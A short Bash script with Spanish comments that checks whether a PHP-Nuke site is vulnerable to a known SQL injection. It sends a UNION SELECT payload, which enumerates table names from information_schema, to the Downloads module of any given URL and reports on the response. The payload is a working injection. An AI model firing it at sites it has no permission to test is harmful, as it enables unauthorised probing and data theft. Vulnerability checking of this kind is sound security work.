#!/bin/bash
# Script de prueba de vulnerabilidad OSVDB-397 
# Verifica si un sitio web antiguo de PHP-Nuke es vulnerable a SQL Injection (OSVDB-397).

if [ $# -ne 1 ]; then
  echo "Uso: $0 <URL>"
  exit 1
fi

URL="$1"
VULN_PATH="/modules.php?name=Downloads&d_op=viewdownload&cid="
TEST_PAYLOAD="-1+UNION+SELECT+1,2,3,4,5,6,7,8,9,table_name,11,12,13+FROM+information_schema.tables--"

# Verificar si el sitio es vulnerable
curl -s "${URL}${VULN_PATH}${TEST_PAYLOAD}" | grep -q "Download Details"
if [ $? -eq 0 ]; then
  echo "[!] Vulnerabilidad OSVDB-397 posiblemente presente."
else
  echo "[+] El sistema no parece vulnerable."
fi
